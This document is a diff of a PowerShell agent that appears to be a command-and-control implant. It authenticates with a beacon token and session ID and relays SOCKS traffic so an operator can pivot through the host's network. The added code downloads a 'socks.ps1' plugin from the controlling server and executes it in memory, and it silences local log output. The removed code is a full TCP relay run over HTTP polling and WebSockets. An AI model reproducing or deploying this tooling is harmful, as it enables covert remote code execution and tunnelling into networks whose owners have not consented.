@@ -130,6 +130,7 @@ $script:RmmSocksWorker = @{
     Async      = $null
 }
 $script:RmmSocksLogQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
+$script:RmmSocksPluginLoaded = $false
 
 if ($script:UsePersistentHttp) {
     $script:RmmCookieContainer = New-Object System.Net.CookieContainer
@@ -756,99 +757,80 @@ function Get-RmmCmdSocksActive {
     return $false
 }
 
+function Get-RmmPluginScript {
+    param([Parameter(Mandatory = $true)][string]$PluginName)
+    if ($PluginName -notmatch '^[A-Za-z0-9][A-Za-z0-9._-]{0,127}\.ps1$') {
+        throw "Invalid pivot plugin name: $PluginName"
+    }
+    $headers = Get-RmmRequestHeaders
+    $uri = "$u/tools/plugins/$PluginName?id=$([uri]::EscapeDataString($sessionId))"
+    $source = Invoke-RmmRestMethod -Uri $uri -Method Get -Headers $headers -RestErrorAction Stop
+    if ($source -is [string]) { return $source }
+    return [string]$source
+}
+
+function Ensure-RmmSocksPlugin {
+    if ($script:RmmSocksPluginLoaded) { return $true }
+    try {
+        $source = Get-RmmPluginScript -PluginName 'socks.ps1'
+        if ([string]::IsNullOrWhiteSpace($source)) {
+            throw 'SOCKS pivot plugin is empty'
+        }
+        . ([scriptblock]::Create($source))
+        foreach ($name in @('Start-RmmSocksChannelPlugin', 'Stop-RmmSocksChannelPlugin')) {
+            if (-not (Get-Command $name -CommandType Function -ErrorAction SilentlyContinue)) {
+                throw "SOCKS pivot plugin is missing $name"
+            }
+        }
+        $script:RmmSocksPluginLoaded = $true
+        return $true
+    } catch {
+        return $false
+    }
+}
+
 function Drain-RmmSocksHostLog {
     [RmmHostAnchor]::Restore()
     if ($null -eq $script:RmmSocksLogQueue) { return }
     $line = $null
     while ($script:RmmSocksLogQueue.TryDequeue([ref]$line)) {
-        $color = 'Gray'
-        if ($line -match '^\[\+\]') { $color = 'Green' }
-        elseif ($line -match '^\[\*\]') { $color = 'Cyan' }
-        elseif ($line -match '^\[!\]') { $color = 'Yellow' }
-        elseif ($line -match '^\[-\]') { $color = 'Red' }
-        elseif ($line -match '^\[dbg\]') { $color = 'DarkGray' }
-        Write-Host $line -ForegroundColor $color
+        $line = $null
     }
 }
 
-function Sync-RmmSocksChannelFromServer {
-    param($CmdData)
-    $active = Get-RmmCmdSocksActive -CmdData $CmdData
-    if ($active -and -not $script:RmmSocksWorker.Running) {
-        Start-RmmSocksChannelWorker
-    } elseif (-not $active -and $script:RmmSocksWorker.Running) {
-        Stop-RmmSocksChannelWorker
+function Stop-RmmSocksChannelWorker {
+    if ($script:RmmSocksPluginLoaded) {
+        Stop-RmmSocksChannelPlugin -WorkerState $script:RmmSocksWorker
     }
     Drain-RmmSocksHostLog
     [RmmHostAnchor]::Restore()
 }
 
-function Get-RmmSocksPollActive {
-    param($Poll)
-    if ($null -eq $Poll) { return $false }
-    $obj = $Poll
-    if ($obj -is [string]) {
-        try { $obj = $obj | ConvertFrom-Json } catch { return $false }
-    }
-    foreach ($p in $obj.PSObject.Properties) {
-        if ($p.Name -match '^(?i)active$') { return [bool]$p.Value }
-    }
-    return $false
-}
-
-function Get-RmmSocksTasksFromPoll {
-    param($Poll)
-    if ($null -eq $Poll) { return @() }
-    $obj = $Poll
-    if ($obj -is [string]) {
-        try { $obj = $obj | ConvertFrom-Json } catch { return @() }
-    }
-    $rawTasks = $null
-    if ($obj -is [hashtable]) {
-        if ($obj.ContainsKey('tasks')) { $rawTasks = $obj['tasks'] }
-    } elseif ($null -ne $obj) {
-        foreach ($p in $obj.PSObject.Properties) {
-            if ($p.Name -match '^(?i)tasks$') { $rawTasks = $p.Value; break }
+function Sync-RmmSocksChannelFromServer {
+    param($CmdData)
+    $active = Get-RmmCmdSocksActive -CmdData $CmdData
+    if ($active) {
+        if (-not (Ensure-RmmSocksPlugin)) {
+            Drain-RmmSocksHostLog
+            return
         }
-    }
-    if ($null -eq $rawTasks) { return @() }
-    $normalized = New-Object System.Collections.ArrayList
-    foreach ($t in @($rawTasks)) {
-        if ($null -eq $t) { continue }
-        if ($t -is [hashtable]) {
-            [void]$normalized.Add($t)
-        } else {
-            $portVal = 0
-            if ($null -ne $t.port) { $portVal = [int]$t.port }
-            [void]$normalized.Add(@{
-                op       = [string]$t.op
-                id       = [string]$t.id
-                host     = [string]$t.host
-                port     = $portVal
-                data_b64 = [string]$t.data_b64
-            })
+        if (-not $script:RmmSocksWorker.Running) {
+            Start-RmmSocksChannelPlugin `
+                -WorkerState $script:RmmSocksWorker `
+                -LogQueue $script:RmmSocksLogQueue `
+                -BaseUrl $u `
+                -SessionId $sessionId `
+                -BeaconSecret $beaconSecret `
+                -HttpProxy $httpProxy `
+                -HttpProxyUseDefaultCredentials $httpProxyUseDefaultCredentials `
+                -VerboseMode ([bool]$script:RmmVerbose) `
+                -WebProxy $script:RmmWebProxy
         }
+    } elseif ($script:RmmSocksWorker.Running) {
+        Stop-RmmSocksChannelWorker
     }
-    return @($normalized)
-}
-
-function Sort-RmmSocksTasks {
-    param($Tasks)
-    if ($null -eq $Tasks -or $Tasks.Count -eq 0) { return @() }
-    $connects = [System.Collections.ArrayList]@()
-    $sends = [System.Collections.ArrayList]@()
-    $closes = [System.Collections.ArrayList]@()
-    $other = [System.Collections.ArrayList]@()
-    foreach ($t in $Tasks) {
-        $op = ([string]$t.op).ToLowerInvariant()
-        switch ($op) {
-            'connect' { [void]$connects.Add($t) }
-            'send'    { [void]$sends.Add($t) }
-            'close'   { [void]$closes.Add($t) }
-            default   { [void]$other.Add($t) }
-        }
-    }
-    return @($connects) + @($sends) + @($closes) + @($other)
+    Drain-RmmSocksHostLog
+    [RmmHostAnchor]::Restore()
 }
 
 function Test-RmmInternalCommand {
@@ -1555,671 +1537,6 @@ function Send-RmmFileDownload {
     }
 }
 
-function Read-RmmSocksTcpChunk {
-    param(
-        [System.Net.Sockets.TcpClient]$Tcp,
-        [int]$ReadTimeoutMs = 150
-    )
-    if (-not $Tcp) { return $null }
-    try {
-        $stream = $Tcp.GetStream()
-        $stream.ReadTimeout = $ReadTimeoutMs
-        $buf = New-Object byte[] 16384
-        $n = $stream.Read($buf, 0, $buf.Length)
-        if ($n -le 0) { return @{ eof = $true } }
-        return @{ eof = $false; bytes = $buf; length = $n }
-    } catch [System.IO.IOException] {
-        $inner = $_.Exception.InnerException
-        if ($inner -is [System.Net.Sockets.SocketException]) {
-            if ($inner.SocketErrorCode -eq [System.Net.Sockets.SocketError]::TimedOut) {
-                return @{ eof = $false; timeout = $true }
-            }
-        }
-        if ($_.Exception.Message -match 'timed out|time-out|Timeout') {
-            return @{ eof = $false; timeout = $true }
-        }
-        throw
-    }
-}
-
-function Invoke-RmmSocksCycle {
-    param(
-        [hashtable]$Headers,
-        $Poll = $null,
-        [switch]$EmitResponsesOnly
-    )
-    if ($null -eq $Poll) {
-        $pollUrl = "$u/socks?id=$sessionId"
-        $Poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
-        if ($null -eq $Poll) {
-            Write-RmmLog "SOCKS GET $pollUrl failed (check beacon token and server version)" -Level WARN
-            return $false
-        }
-    }
-    $tasks = Sort-RmmSocksTasks -Tasks (Get-RmmSocksTasksFromPoll -Poll $Poll)
-    $responses = New-Object System.Collections.ArrayList
-    foreach ($task in $tasks) {
-        $op = [string]$task.op
-        $tid = [string]$task.id
-        if (-not $tid) { continue }
-        if ($op -eq 'connect') {
-            $destHost = [string]$task.host
-            $port = [int]$task.port
-            if ($script:RmmSocksConnections.ContainsKey($tid)) {
-                [void]$responses.Add(@{ id = $tid; op = 'ok' })
-                continue
-            }
-            try {
-                if ($destHost -match '[^0-9a-fA-F.:]') {
-                    Write-RmmLog "SOCKS DNS for '$destHost' runs on the agent host, not your operator PC" -Level DEBUG
-                }
-                $tcp = New-Object System.Net.Sockets.TcpClient
-                $tcp.ReceiveTimeout = 0
-                $tcp.SendTimeout = 60000
-                $connectMs = 20000
-                $iar = $tcp.BeginConnect($destHost, $port, $null, $null)
-                if (-not $iar.AsyncWaitHandle.WaitOne($connectMs, $false)) {
-                    $tcp.Close()
-                    throw [System.TimeoutException]::new("Connect timed out after ${connectMs}ms")
-                }
-                $tcp.EndConnect($iar)
-                $tcp.NoDelay = $true
-                $script:RmmSocksConnections[$tid] = $tcp
-                Write-RmmLog "SOCKS outbound TCP $destHost`:$port (id $($tid.Substring(0,8)))" -Level INFO
-                [void]$responses.Add(@{ id = $tid; op = 'ok' })
-            } catch {
-                Write-RmmLog "SOCKS connect $destHost`:$port failed: $($_.Exception.Message)" -Level WARN
-                [void]$responses.Add(@{ id = $tid; op = 'error'; msg = $_.Exception.Message })
-            }
-        }
-        elseif ($op -eq 'send') {
-            $tcp = $script:RmmSocksConnections[$tid]
-            if (-not $tcp) { continue }
-            try {
-                $raw = [Convert]::FromBase64String([string]$task.data_b64)
-                $stream = $tcp.GetStream()
-                $stream.Write($raw, 0, $raw.Length)
-            } catch {
-                try { $tcp.Close() } catch { }
-                $script:RmmSocksConnections.Remove($tid) | Out-Null
-                [void]$responses.Add(@{ id = $tid; op = 'closed' })
-            }
-        }
-        elseif ($op -eq 'close') {
-            $tcp = $script:RmmSocksConnections[$tid]
-            if ($tcp) {
-                try { $tcp.Close() } catch { }
-            }
-            $script:RmmSocksConnections.Remove($tid) | Out-Null
-        }
-    }
-    foreach ($tid in @($script:RmmSocksConnections.Keys)) {
-        $tcp = $script:RmmSocksConnections[$tid]
-        if (-not $tcp) { continue }
-        try {
-            $closed = $false
-            $idleReads = 0
-            while ($idleReads -lt 4) {
-                $chunk = Read-RmmSocksTcpChunk -Tcp $tcp -ReadTimeoutMs 50
-                if ($null -eq $chunk) { break }
-                if ($chunk.timeout) {
-                    $idleReads++
-                    continue
-                }
-                $idleReads = 0
-                if ($chunk.eof) {
-                    $closed = $true
-                    break
-                }
-                $b64 = [Convert]::ToBase64String($chunk.bytes, 0, $chunk.length)
-                [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $b64 })
-            }
-            if ($closed) {
-                try { $tcp.Close() } catch { }
-                $script:RmmSocksConnections.Remove($tid) | Out-Null
-                [void]$responses.Add(@{ id = $tid; op = 'closed' })
-            }
-        } catch {
-            try { $tcp.Close() } catch { }
-            $script:RmmSocksConnections.Remove($tid) | Out-Null
-            [void]$responses.Add(@{ id = $tid; op = 'closed' })
-        }
-    }
-    if ($EmitResponsesOnly) {
-        return @{ ok = $true; responses = @($responses) }
-    }
-    if ($responses.Count -gt 0) {
-        $body = @{ responses = @($responses) } | ConvertTo-Json -Compress -Depth 6
-        $postUrl = "$u/socks?id=$sessionId"
-        $posted = Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
-        if ($null -eq $posted) {
-            Write-RmmLog "SOCKS POST $postUrl failed ($($responses.Count) response(s) not acked)" -Level WARN
-            return $false
-        }
-    }
-    return $true
-}
-
-function Get-RmmSocksWsConnectInfo {
-    # Same IPv4 wire + Host header as Invoke-RmmRestMethod (required for many tunnels).
-    $httpUri = [Uri]"$($u.TrimEnd('/'))/socks?id=$sessionId"
-    $resolved = Resolve-RmmTunnelIpv4 -Uri $httpUri
-    $builder = New-Object System.UriBuilder $httpUri
-    if ($httpUri.Scheme -match '(?i)^https') { $builder.Scheme = 'wss' } else { $builder.Scheme = 'ws' }
-    $builder.Host = $resolved.Ipv4.ToString()
-    if ($builder.Port -lt 1) {
-        $builder.Port = if ($builder.Scheme -eq 'wss') { 443 } else { 80 }
-    }
-    $builder.Path = '/socks'
-    $builder.Query = "id=$sessionId"
-    return @{
-        Uri        = $builder.Uri
-        HostHeader = $resolved.OriginalHost
-    }
-}
-
-function Send-RmmSocksResponsesWs {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [System.Collections.ArrayList]$Responses
-    )
-    if ($null -eq $Responses -or $Responses.Count -eq 0) { return }
-    $normalized = New-Object System.Collections.ArrayList
-    foreach ($r in $Responses) {
-        if ($r -is [hashtable]) {
-            [void]$normalized.Add($r)
-        } else {
-            $item = @{ id = [string]$r.id; op = [string]$r.op }
-            if ($null -ne $r.PSObject.Properties['msg']) { $item.msg = [string]$r.msg }
-            if ($null -ne $r.PSObject.Properties['data_b64']) { $item.data_b64 = [string]$r.data_b64 }
-            [void]$normalized.Add($item)
-        }
-    }
-    # Chunk large batches so Cloudflare/tunnel proxies do not drop oversized WS frames.
-    $batch = New-Object System.Collections.ArrayList
-    $batchBytes = 0
-    $maxItems = 12
-    $maxBytes = 450000
-    foreach ($r in $normalized) {
-        $est = 64
-        if ($r.ContainsKey('data_b64') -and $r['data_b64']) { $est += [string]$r['data_b64'].Length }
-        if ($batch.Count -ge $maxItems -or ($batchBytes + $est) -gt $maxBytes) {
-            if ($batch.Count -gt 0) {
-                Send-RmmSocksWsJson -WebSocket $WebSocket -Message @{ op = 'responses'; responses = @($batch) }
-                $batch = New-Object System.Collections.ArrayList
-                $batchBytes = 0
-            }
-        }
-        [void]$batch.Add($r)
-        $batchBytes += $est
-    }
-    if ($batch.Count -gt 0) {
-        Send-RmmSocksWsJson -WebSocket $WebSocket -Message @{ op = 'responses'; responses = @($batch) }
-    }
-}
-
-function Test-RmmSocksWsOpen {
-    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
-    return $WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open
-}
-
-function Close-RmmSocksWebSocket {
-    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
-    if ($null -eq $WebSocket) { return }
-    try {
-        if ($WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-            $null = $WebSocket.CloseAsync(
-                [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
-                '',
-                [System.Threading.CancellationToken]::None
-            ).GetAwaiter().GetResult()
-        }
-    } catch { }
-    try { $WebSocket.Dispose() } catch { }
-}
-
-function Send-RmmSocksWsJson {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        $Message
-    )
-    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
-        throw [System.InvalidOperationException]::new(
-            "SOCKS WebSocket not open (state=$($WebSocket.State))"
-        )
-    }
-    $json = $Message | ConvertTo-Json -Compress -Depth 10
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
-    $seg = [System.ArraySegment[byte]]::new($bytes)
-    try {
-        $null = $WebSocket.SendAsync(
-            $seg,
-            [System.Net.WebSockets.WebSocketMessageType]::Text,
-            $true,
-            [System.Threading.CancellationToken]::None
-        ).GetAwaiter().GetResult()
-    } catch [System.Net.WebSockets.WebSocketException] {
-        throw [System.InvalidOperationException]::new(
-            "SOCKS WebSocket send failed (state=$($WebSocket.State)): $($_.Exception.Message)"
-        )
-    }
-}
-
-function Receive-RmmSocksWsJson {
-    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
-    # Never cancel ReceiveAsync — on .NET, cancellation leaves the socket Aborted.
-    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
-        return @{ op = 'close' }
-    }
-    $buf = New-Object byte[] 262144
-    $seg = [System.ArraySegment[byte]]::new($buf)
-    $sb = New-Object System.Text.StringBuilder
-    try {
-        while ($true) {
-            $recv = $WebSocket.ReceiveAsync(
-                $seg,
-                [System.Threading.CancellationToken]::None
-            ).GetAwaiter().GetResult()
-            if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-                return @{ op = 'close' }
-            }
-            [void]$sb.Append([System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count))
-            if ($recv.EndOfMessage) {
-                try {
-                    return ($sb.ToString() | ConvertFrom-Json)
-                } catch {
-                    return $null
-                }
-            }
-        }
-    } catch [System.Net.WebSockets.WebSocketException] {
-        return @{ op = 'close' }
-    } catch {
-        if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
-            return @{ op = 'close' }
-        }
-        throw
-    }
-}
-
-function Invoke-RmmSocksDrainTcpToWs {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [hashtable]$Headers,
-        $EmptyPoll
-    )
-    $passes = if ($script:RmmSocksConnections.Count -gt 0) { 16 } else { 1 }
-    for ($p = 0; $p -lt $passes; $p++) {
-        $drain = Invoke-RmmSocksCycle -Headers $Headers -Poll $EmptyPoll -EmitResponsesOnly
-        if (-not $drain.responses -or $drain.responses.Count -eq 0) { break }
-        Send-RmmSocksResponsesWs -WebSocket $WebSocket -Responses $drain.responses
-    }
-}
-
-function Invoke-RmmSocksHandleWsMessages {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [hashtable]$Headers,
-        $Messages
-    )
-    if ($null -eq $Messages -or $Messages.Count -eq 0) { return $null }
-    foreach ($msg in $Messages) {
-        if ($null -eq $msg) { continue }
-        if ($msg.op -eq 'close') { return 'stop' }
-        if ($msg.op -eq 'active' -and -not [bool]$msg.active) { return 'stop' }
-        if ($msg.op -eq 'pong') { continue }
-        if ($msg.op -eq 'tasks') {
-            $taskList = Get-RmmSocksTasksFromPoll -Poll @{ active = $true; tasks = @($msg.tasks) }
-            if ($taskList.Count -gt 0) {
-                Invoke-RmmSocksProcessWsTasks -WebSocket $WebSocket -Headers $Headers -Tasks $taskList
-            }
-        }
-    }
-    return $null
-}
-
-function Connect-RmmSocksClientWebSocket {
-    $info = Get-RmmSocksWsConnectInfo
-    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
-    try {
-        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(20)
-    } catch { }
-    if ($beaconSecret) {
-        $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
-    }
-    [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
-    $origin = $u.TrimEnd('/')
-    if ($origin -match '(?i)^https?://') {
-        $ws.Options.SetRequestHeader('Origin', $origin)
-    }
-    Write-RmmLog "SOCKS WS connect $($info.Uri) Host=$($info.HostHeader)" -Level DEBUG
-    $lastErr = $null
-    foreach ($attempt in 1..5) {
-        if ($attempt -gt 1) { Start-Sleep -Milliseconds 400 }
-        try {
-            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::None) {
-                $ws.Dispose()
-                $ws = [System.Net.WebSockets.ClientWebSocket]::new()
-                if ($beaconSecret) {
-                    $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
-                }
-                [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
-                if ($origin -match '(?i)^https?://') {
-                    $ws.Options.SetRequestHeader('Origin', $origin)
-                }
-            }
-            $null = $ws.ConnectAsync($info.Uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
-            return $ws
-        } catch {
-            $lastErr = $_
-        }
-    }
-    throw $lastErr
-}
-
-function Invoke-RmmSocksProcessWsTasks {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [hashtable]$Headers,
-        $Tasks
-    )
-    if ($null -eq $Tasks -or $Tasks.Count -eq 0) { return }
-    Write-RmmSocksHostLine "[*] SOCKS WS: $($Tasks.Count) task(s)"
-    $poll = @{ active = $true; tasks = $Tasks }
-    $result = Invoke-RmmSocksCycle -Headers $Headers -Poll $poll -EmitResponsesOnly
-    if ($result.responses -and $result.responses.Count -gt 0) {
-        Send-RmmSocksResponsesWs -WebSocket $WebSocket -Responses $result.responses
-    }
-}
-
-function Invoke-RmmSocksWsRelay {
-    $ws = Connect-RmmSocksClientWebSocket
-    Write-RmmSocksHostLine '[+] SOCKS WebSocket channel active (pull/push)'
-    $headers = Get-RmmRequestHeaders
-    $emptyPoll = @{ active = $true; tasks = @() }
-    try {
-        $boot = Receive-RmmSocksWsJson -WebSocket $ws
-        if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages @($boot)) -eq 'stop') {
-            Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
-            return
-        }
-        while (-not $RmmSocksChannelStop) {
-            Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
-            $spin = 0
-            $hadTasks = $true
-            while ($hadTasks -and $spin -lt 64) {
-                $spin++
-                $hadTasks = $false
-                Send-RmmSocksWsJson -WebSocket $ws -Message @{ op = 'pull' }
-                $reply = Receive-RmmSocksWsJson -WebSocket $ws
-                if ($null -eq $reply -or $reply.op -eq 'close') {
-                    throw [System.IO.IOException]::new('SOCKS WebSocket closed by server')
-                }
-                if ($reply.op -eq 'active' -and -not [bool]$reply.active) {
-                    Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
-                    return
-                }
-                if ($reply.op -eq 'tasks') {
-                    $taskList = Get-RmmSocksTasksFromPoll -Poll @{ active = $true; tasks = @($reply.tasks) }
-                    if ($taskList.Count -gt 0) {
-                        $hadTasks = $true
-                        Invoke-RmmSocksProcessWsTasks -WebSocket $ws -Headers $headers -Tasks $taskList
-                    }
-                }
-                Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
-            }
-        }
-    } finally {
-        Close-RmmSocksWebSocket -WebSocket $ws
-    }
-}
-
-function Invoke-RmmSocksHttpRelay {
-    while (-not $RmmSocksChannelStop) {
-        try {
-            $headers = Get-RmmRequestHeaders
-            $pollUrl = "$u/socks?id=$sessionId"
-            $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $headers -RestErrorAction SilentlyContinue
-            if (-not (Get-RmmSocksPollActive -Poll $poll)) {
-                Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
-                break
-            }
-            if (-not $script:RmmSocksChannelWasActive) {
-                Write-RmmSocksHostLine '[+] SOCKS channel active (/socks HTTP poll)'
-                $script:RmmSocksChannelWasActive = $true
-            }
-            $cycleOk = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
-            if ($cycleOk -eq $false) {
-                Write-RmmSocksHostLine '[!] SOCKS cycle failed (check beacon token / server)'
-            }
-            Start-Sleep -Milliseconds 25
-        } catch {
-            Write-RmmSocksHostLine "[!] SOCKS channel error: $($_.Exception.Message)"
-            Start-Sleep -Milliseconds 400
-        }
-    }
-}
-
-function Get-RmmSocksWorkerFunctionNames {
-    # Dependency order: callees before callers; all must be re-defined inside the worker runspace.
-    @(
-        'Get-RandomUserAgent',
-        'Get-RmmHttpStatusHint',
-        'Get-RmmHttpErrorBody',
-        'Convert-RmmHttpResponseContent',
-        'Resolve-RmmTunnelIpv4',
-        'Write-RmmLog',
-        'Invoke-RmmRestMethod',
-        'Get-RmmRequestHeaders',
-        'Get-RmmSocksPollActive',
-        'Get-RmmSocksTasksFromPoll',
-        'Read-RmmSocksTcpChunk',
-        'Invoke-RmmSocksCycle',
-        'Get-RmmSocksWsConnectInfo',
-        'Connect-RmmSocksClientWebSocket',
-        'Test-RmmSocksWsOpen',
-        'Close-RmmSocksWebSocket',
-        'Send-RmmSocksWsJson',
-        'Sort-RmmSocksTasks',
-        'Receive-RmmSocksWsJson',
-        'Send-RmmSocksResponsesWs',
-        'Invoke-RmmSocksDrainTcpToWs',
-        'Invoke-RmmSocksHandleWsMessages',
-        'Invoke-RmmSocksProcessWsTasks',
-        'Invoke-RmmSocksWsRelay',
-        'Invoke-RmmSocksHttpRelay'
-    )
-}
-
-function Import-RmmFunctionsIntoRunspace {
-    param(
-        [System.Management.Automation.PowerShell]$PowerShellInstance,
-        [string[]]$FunctionNames
-    )
-    foreach ($name in $FunctionNames) {
-        $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
-        $def = $cmd.ScriptBlock.ToString()
-        $null = $PowerShellInstance.AddScript("function global:$name { $def }", $false).Invoke()
-        if ($PowerShellInstance.Streams.Error.Count -gt 0) {
-            $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
-            $PowerShellInstance.Streams.Error.Clear()
-            throw "Failed to import function $name`: $errs"
-        }
-        $PowerShellInstance.Commands.Clear()
-    }
-    $null = $PowerShellInstance.AddScript(
-        @'
-if (-not (Get-Command Invoke-RmmRestMethod -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Invoke-RmmRestMethod missing' }
-if (-not (Get-Command Get-RmmSocksTasksFromPoll -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Get-RmmSocksTasksFromPoll missing' }
-if (-not (Get-Command New-Object -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: New-Object missing (session state)' }
-'@,
-        $false
-    ).Invoke()
-    if ($PowerShellInstance.Streams.Error.Count -gt 0) {
-        $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
-        $PowerShellInstance.Streams.Error.Clear()
-        throw "SOCKS bootstrap verification failed: $errs"
-    }
-    $PowerShellInstance.Commands.Clear()
-}
-
-function Install-RmmSocksRunspaceHostLog {
-    param([System.Management.Automation.PowerShell]$PowerShellInstance)
-    $null = $PowerShellInstance.AddScript({
-        function Write-RmmSocksHostLine {
-            param([Parameter(Mandatory = $true)][string]$Message)
-            if ($null -ne $script:RmmSocksLogQueue) {
-                [void]$script:RmmSocksLogQueue.Enqueue($Message)
-            }
-        }
-        function Write-RmmLog {
-            param(
-                [Parameter(Mandatory = $true)][string]$Message,
-                [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO'
-            )
-            if ($Level -eq 'DEBUG' -and -not $script:RmmVerbose) { return }
-            $prefix = switch ($Level) {
-                'WARN'  { '[!]' }
-                'ERROR' { '[-]' }
-                'DEBUG' { '[dbg]' }
-                default { '[*]' }
-            }
-            Write-RmmSocksHostLine "$prefix $Message"
-        }
-    }, $false).Invoke()
-    if ($PowerShellInstance.Streams.Error.Count -gt 0) {
-        $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
-        $PowerShellInstance.Streams.Error.Clear()
-        throw "SOCKS host log install failed: $errs"
-    }
-    $PowerShellInstance.Commands.Clear()
-}
-
-function New-RmmSocksRunspace {
-    $fnNames = Get-RmmSocksWorkerFunctionNames
-    $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-    $rs = [runspacefactory]::CreateRunspace($iss)
-    # UseNewThread: ReuseThread can leave this runspace as the thread DefaultRunspace and break the host beacon loop.
-    $rs.ThreadOptions = 'UseNewThread'
-    $rs.Open()
-    $bootstrap = [PowerShell]::Create()
-    $bootstrap.Runspace = $rs
-    try {
-        Import-RmmFunctionsIntoRunspace -PowerShellInstance $bootstrap -FunctionNames $fnNames
-        Install-RmmSocksRunspaceHostLog -PowerShellInstance $bootstrap
-    } finally {
-        $bootstrap.Dispose()
-    }
-    return $rs
-}
-
-function Set-RmmSocksRunspaceVariables {
-    param(
-        [System.Management.Automation.Runspaces.Runspace]$Runspace,
-        [hashtable]$Vars
-    )
-    foreach ($key in $Vars.Keys) {
-        $Runspace.SessionStateProxy.SetVariable($key, $Vars[$key])
-    }
-}
-
-function Start-RmmSocksChannelWorker {
-    if ($script:RmmSocksWorker.Running) { return }
-
-    try {
-        $socksRs = New-RmmSocksRunspace
-    } catch {
-        Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
-        return
-    }
-
-    $socksCookie = New-Object System.Net.CookieContainer
-    Set-RmmSocksRunspaceVariables -Runspace $socksRs -Vars @{
-        u                              = $u
-        sessionId                      = $sessionId
-        beaconSecret                   = $beaconSecret
-        httpProxy                      = $httpProxy
-        httpProxyUseDefaultCredentials = $httpProxyUseDefaultCredentials
-        RmmSocksChannelStop            = $false
-        RmmSocksLogQueue               = $script:RmmSocksLogQueue
-    }
-
-    $ps = [PowerShell]::Create()
-    $ps.Runspace = $socksRs
-    [void]$ps.AddScript({
-        param($Verbose, $Cookie, $Proxy, $LogQueue)
-        $script:RmmVerbose = [bool]$Verbose
-        $script:UsePersistentHttp = $true
-        $script:RmmCookieContainer = $Cookie
-        $script:RmmWebProxy = $Proxy
-        $script:RmmSocksConnections = @{}
-        $script:RmmSocksChannelWasActive = $false
-        $script:RmmSocksLogQueue = $LogQueue
-        $useHttpSocks = [bool]$httpProxy -and "$httpProxy".Trim().Length -gt 0
-        if ($useHttpSocks) {
-            Write-RmmSocksHostLine '[*] SOCKS using HTTP poll (WebSocket skipped when httpProxy is set)'
-            Invoke-RmmSocksHttpRelay
-        } else {
-            $wsFail = 0
-            while (-not $RmmSocksChannelStop -and $wsFail -lt 12) {
-                try {
-                    Invoke-RmmSocksWsRelay
-                    break
-                } catch {
-                    $wsFail++
-                    Write-RmmSocksHostLine "[!] SOCKS WebSocket error ($wsFail/12): $($_.Exception.Message)"
-                    Start-Sleep -Seconds 2
-                }
-            }
-            if (-not $RmmSocksChannelStop -and $wsFail -ge 12) {
-                Write-RmmSocksHostLine '[!] SOCKS WebSocket unavailable; falling back to HTTP poll'
-                Invoke-RmmSocksHttpRelay
-            }
-        }
-        foreach ($id in @($script:RmmSocksConnections.Keys)) {
-            try { $script:RmmSocksConnections[$id].Close() } catch { }
-        }
-        Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
-    }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy).AddArgument($script:RmmSocksLogQueue)
-    try {
-        $async = $ps.BeginInvoke()
-    } catch {
-        Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
-        $ps.Dispose()
-        $socksRs.Close()
-        return
-    }
-    [RmmHostAnchor]::Restore()
-
-    $script:RmmSocksWorker.Running = $true
-    $script:RmmSocksWorker.Runspace = $socksRs
-    $script:RmmSocksWorker.PowerShell = $ps
